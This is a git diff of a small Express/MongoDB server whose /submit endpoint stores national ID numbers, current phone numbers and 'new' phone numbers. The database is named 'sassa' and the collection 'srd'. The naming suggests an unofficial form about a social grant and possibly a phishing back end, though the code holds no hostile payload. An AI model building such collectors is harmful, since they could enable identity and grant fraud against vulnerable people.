@@ -1,58 +1,33 @@
 const express = require('express');
-const path = require('path');
+const mongoose = require('mongoose');
 const cors = require('cors');
-const { MongoClient } = require('mongodb');
+require('dotenv').config();
+const Application = require('./models/Application');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Static files (index.html, image)
-app.use(express.static(__dirname));
+mongoose.connect(process.env.MONGO_URI)
+  .then(() => console.log("MongoDB connected"))
+  .catch(err => console.error("MongoDB error:", err));
 
-const uri = process.env.MONGODB_URI; // Store in Render ENV vars
-const client = new MongoClient(uri, {
-  tls: true,
+app.post('/submit', async (req, res) => {
+  const { idNumber, phoneNumber, newphoneNumber } = req.body;
+
+  const recent = await Application.findOne({
+    idNumber,
+    submittedAt: { $gt: new Date(Date.now() - 24 * 60 * 60 * 1000) }
+  });
+
+  if (recent) return res.status(409).json({ message: "Request already submitted in the past 24h" });
+
+  const application = new Application({ idNumber, phoneNumber, newphoneNumber });
+  await application.save();
+
+  res.status(201).json({ message: "Application received" });
 });
 
-let collection;
-
-async function startServer() {
-  try {
-    await client.connect();
-    const db = client.db('sassa');
-    collection = db.collection('srd');
-
-    app.post('/submit', async (req, res) => {
-      const { idNumber, phoneNumber, newphoneNumber } = req.body;
-      try {
-        const exists = await collection.findOne({ idNumber, phoneNumber });
-        if (exists) return res.status(409).send('Duplicate application');
-
-        await collection.insertOne({
-          idNumber,
-          phoneNumber,
-          newphoneNumber,
-          timestamp: new Date(),
-        });
-
-        res.status(200).send('Application submitted');
-      } catch (err) {
-        console.error(err);
-        res.status(500).send('Server error');
-      }
-    });
-
-    // Fallback to index.html
-    app.get('*', (req, res) => {
-      res.sendFile(path.join(__dirname, 'index.html'));
-    });
-
-    const PORT = process.env.PORT || 3000;
-    app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-  } catch (err) {
-    console.error('Failed to connect to DB:', err);
-  }
-}
-
-startServer();
+app.listen(process.env.PORT, () => {
+  console.log(`Server running on port ${process.env.PORT}`);
+});
